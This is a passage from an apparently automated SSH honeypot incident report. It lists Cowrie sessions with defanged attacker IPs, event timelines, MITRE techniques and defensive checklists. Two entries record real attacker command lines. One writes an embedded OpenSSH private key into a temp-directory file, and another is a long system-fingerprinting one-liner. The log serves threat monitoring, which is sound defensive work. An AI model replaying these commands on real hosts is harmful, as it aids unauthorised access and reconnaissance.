- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8e4264675f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-08-12 02:58 |
| **Last Seen** | 2026-08-12 02:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:58:09` | `cowrie.session.connect` |
| `2026-08-12 02:58:09` | `cowrie.client.version` |
| `2026-08-12 02:58:09` | `cowrie.client.kex` |
| `2026-08-12 02:58:11` | `cowrie.login.success` |
| `2026-08-12 02:58:11` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31862108165d

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-08-12 03:04 |
| **Last Seen** | 2026-08-12 03:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:04:08` | `cowrie.session.connect` |
| `2026-08-12 03:04:08` | `cowrie.client.version` |
| `2026-08-12 03:04:09` | `cowrie.client.kex` |
| `2026-08-12 03:04:09` | `cowrie.login.success` |
| `2026-08-12 03:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c3e9832acd4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-12 03:04 |
| **Last Seen** | 2026-08-12 03:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:04:09` | `cowrie.session.connect` |
| `2026-08-12 03:04:09` | `cowrie.client.version` |
| `2026-08-12 03:04:09` | `cowrie.client.kex` |
| `2026-08-12 03:04:10` | `cowrie.login.success` |
| `2026-08-12 03:04:11` | `cowrie.session.params` |
| `2026-08-12 03:04:11` | `cowrie.command.input` |
| `2026-08-12 03:04:12` | `cowrie.session.file_download` |
| `2026-08-12 03:04:12` | `cowrie.session.file_download` |
| `2026-08-12 03:04:12` | `cowrie.log.closed` |
| `2026-08-12 03:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159b36dc7c07

| Field | Detail |
|---|---|
| **Source IP** | `110.164.201[.]73` |
| **First Seen** | 2026-08-12 03:12 |
| **Last Seen** | 2026-08-12 03:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:12:58` | `cowrie.session.connect` |
| `2026-08-12 03:12:59` | `cowrie.client.version` |
| `2026-08-12 03:12:59` | `cowrie.client.kex` |
| `2026-08-12 03:13:01` | `cowrie.login.success` |
| `2026-08-12 03:13:01` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.164.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `110.164.201[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877f220e7107

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-08-12 03:14 |
| **Last Seen** | 2026-08-12 03:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:14:14` | `cowrie.session.connect` |
| `2026-08-12 03:14:14` | `cowrie.client.version` |
| `2026-08-12 03:14:14` | `cowrie.client.kex` |
| `2026-08-12 03:14:16` | `cowrie.login.success` |
| `2026-08-12 03:14:17` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5223719297c2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 03:16 |
| **Last Seen** | 2026-08-12 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:16:50` | `cowrie.session.connect` |
| `2026-08-12 03:16:50` | `cowrie.client.version` |
| `2026-08-12 03:16:50` | `cowrie.client.kex` |
| `2026-08-12 03:16:51` | `cowrie.login.success` |
| `2026-08-12 03:16:51` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:16:51` | `cowrie.direct-tcpip.data` |
| `2026-08-12 03:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e582e4f707dc

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 03:17 |
| **Last Seen** | 2026-08-12 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:17:23` | `cowrie.session.connect` |
| `2026-08-12 03:17:23` | `cowrie.client.version` |
| `2026-08-12 03:17:23` | `cowrie.client.kex` |
| `2026-08-12 03:17:23` | `cowrie.login.success` |
| `2026-08-12 03:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ed3e6134bf

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 03:17 |
| **Last Seen** | 2026-08-12 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:17:23` | `cowrie.session.connect` |
| `2026-08-12 03:17:23` | `cowrie.client.version` |
| `2026-08-12 03:17:23` | `cowrie.client.kex` |
| `2026-08-12 03:17:23` | `cowrie.login.success` |
| `2026-08-12 03:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c619b7801a25

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 03:17 |
| **Last Seen** | 2026-08-12 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:17:33` | `cowrie.session.connect` |
| `2026-08-12 03:17:33` | `cowrie.client.version` |
| `2026-08-12 03:17:33` | `cowrie.client.kex` |
| `2026-08-12 03:17:33` | `cowrie.login.success` |
| `2026-08-12 03:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee206a6eccf

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 03:17 |
| **Last Seen** | 2026-08-12 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:17:33` | `cowrie.session.connect` |
| `2026-08-12 03:17:33` | `cowrie.client.version` |
| `2026-08-12 03:17:33` | `cowrie.client.kex` |
| `2026-08-12 03:17:33` | `cowrie.login.success` |
| `2026-08-12 03:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c812f4eeda5

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-08-12 03:18 |
| **Last Seen** | 2026-08-12 03:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:18:07` | `cowrie.session.connect` |
| `2026-08-12 03:18:07` | `cowrie.client.version` |
| `2026-08-12 03:18:07` | `cowrie.client.kex` |
| `2026-08-12 03:18:09` | `cowrie.login.success` |
| `2026-08-12 03:18:10` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63efe4bd9c48

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-08-12 03:23 |
| **Last Seen** | 2026-08-12 03:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:23:12` | `cowrie.session.connect` |
| `2026-08-12 03:23:13` | `cowrie.client.version` |
| `2026-08-12 03:23:13` | `cowrie.client.kex` |
| `2026-08-12 03:23:14` | `cowrie.login.success` |
| `2026-08-12 03:23:15` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8002e117bce9

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-12 03:23 |
| **Last Seen** | 2026-08-12 03:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:23:25` | `cowrie.session.connect` |
| `2026-08-12 03:23:25` | `cowrie.client.version` |
| `2026-08-12 03:23:25` | `cowrie.client.kex` |
| `2026-08-12 03:23:26` | `cowrie.login.success` |
| `2026-08-12 03:23:26` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded3c7d1ebfb

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-12 03:31 |
| **Last Seen** | 2026-08-12 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:31:59` | `cowrie.session.connect` |
| `2026-08-12 03:31:59` | `cowrie.client.version` |
| `2026-08-12 03:31:59` | `cowrie.client.kex` |
| `2026-08-12 03:32:00` | `cowrie.login.success` |
| `2026-08-12 03:32:01` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47db82891516

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]38` |
| **First Seen** | 2026-08-12 03:36 |
| **Last Seen** | 2026-08-12 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:36:14` | `cowrie.session.connect` |
| `2026-08-12 03:36:14` | `cowrie.client.version` |
| `2026-08-12 03:36:14` | `cowrie.client.kex` |
| `2026-08-12 03:36:15` | `cowrie.login.success` |
| `2026-08-12 03:36:15` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:36:15` | `cowrie.direct-tcpip.data` |
| `2026-08-12 03:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]38` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a22b72d169

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-12 03:46 |
| **Last Seen** | 2026-08-12 03:51 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:46:49` | `cowrie.session.connect` |
| `2026-08-12 03:46:50` | `cowrie.client.version` |
| `2026-08-12 03:46:50` | `cowrie.client.kex` |
| `2026-08-12 03:46:50` | `cowrie.login.success` |
| `2026-08-12 03:46:51` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ab593e4e04

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-08-12 03:46 |
| **Last Seen** | 2026-08-12 03:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:46:56` | `cowrie.session.connect` |
| `2026-08-12 03:46:56` | `cowrie.client.version` |
| `2026-08-12 03:46:56` | `cowrie.client.kex` |
| `2026-08-12 03:46:58` | `cowrie.login.success` |
| `2026-08-12 03:46:59` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9aba34c603

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-12 03:48 |
| **Last Seen** | 2026-08-12 03:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:48:28` | `cowrie.session.connect` |
| `2026-08-12 03:48:29` | `cowrie.client.version` |
| `2026-08-12 03:48:29` | `cowrie.client.kex` |
| `2026-08-12 03:48:30` | `cowrie.login.success` |
| `2026-08-12 03:48:30` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca1e50ae401

| Field | Detail |
|---|---|
| **Source IP** | `34.76.31[.]34` |
| **First Seen** | 2026-08-12 03:50 |
| **Last Seen** | 2026-08-12 03:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:50:18` | `cowrie.session.connect` |
| `2026-08-12 03:50:18` | `cowrie.client.version` |
| `2026-08-12 03:50:18` | `cowrie.client.kex` |
| `2026-08-12 03:50:20` | `cowrie.login.success` |
| `2026-08-12 03:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.31[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.76.31[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e5cf22c5ca

| Field | Detail |
|---|---|
| **Source IP** | `183.63.220[.]210` |
| **First Seen** | 2026-08-12 03:51 |
| **Last Seen** | 2026-08-12 03:52 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:51:50` | `cowrie.session.connect` |
| `2026-08-12 03:51:51` | `cowrie.client.version` |
| `2026-08-12 03:51:51` | `cowrie.client.kex` |
| `2026-08-12 03:51:56` | `cowrie.login.success` |
| `2026-08-12 03:51:57` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.63.220[.]210` to AbuseIPDB if not already reported
- [ ] Block `183.63.220[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b14ea4a8154

| Field | Detail |
|---|---|
| **Source IP** | `221.202.188[.]169` |
| **First Seen** | 2026-08-12 03:52 |
| **Last Seen** | 2026-08-12 03:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:52:25` | `cowrie.session.connect` |
| `2026-08-12 03:52:26` | `cowrie.client.version` |
| `2026-08-12 03:52:26` | `cowrie.client.kex` |
| `2026-08-12 03:52:30` | `cowrie.login.success` |
| `2026-08-12 03:52:33` | `cowrie.session.params` |
| `2026-08-12 03:52:33` | `cowrie.command.input` |
| `2026-08-12 03:52:34` | `cowrie.log.closed` |
| `2026-08-12 03:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.202.188[.]169` to AbuseIPDB if not already reported
- [ ] Block `221.202.188[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be83ed71a892

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 03:57 |
| **Last Seen** | 2026-08-12 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 03:57:16` | `cowrie.session.connect` |
| `2026-08-12 03:57:16` | `cowrie.client.version` |
| `2026-08-12 03:57:17` | `cowrie.client.kex` |
| `2026-08-12 03:57:17` | `cowrie.login.success` |
| `2026-08-12 03:57:17` | `cowrie.direct-tcpip.request` |
| `2026-08-12 03:57:17` | `cowrie.direct-tcpip.data` |
| `2026-08-12 03:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e123bc7b5d

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-12 04:01 |
| **Last Seen** | 2026-08-12 04:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:01:49` | `cowrie.session.connect` |
| `2026-08-12 04:01:49` | `cowrie.client.version` |
| `2026-08-12 04:01:49` | `cowrie.client.kex` |
| `2026-08-12 04:01:50` | `cowrie.login.success` |
| `2026-08-12 04:01:50` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:01:50` | `cowrie.direct-tcpip.data` |
| `2026-08-12 04:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107db4d2cc86

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:11 |
| **Last Seen** | 2026-08-12 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:11:30` | `cowrie.session.connect` |
| `2026-08-12 04:11:31` | `cowrie.client.version` |
| `2026-08-12 04:11:31` | `cowrie.client.kex` |
| `2026-08-12 04:11:33` | `cowrie.login.success` |
| `2026-08-12 04:11:35` | `cowrie.session.params` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.success` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:35` | `cowrie.command.input` |
| `2026-08-12 04:11:36` | `cowrie.log.closed` |
| `2026-08-12 04:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91975c3681a

| Field | Detail |
|---|---|
| **Source IP** | `34.14.100[.]71` |
| **First Seen** | 2026-08-12 04:12 |
| **Last Seen** | 2026-08-12 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
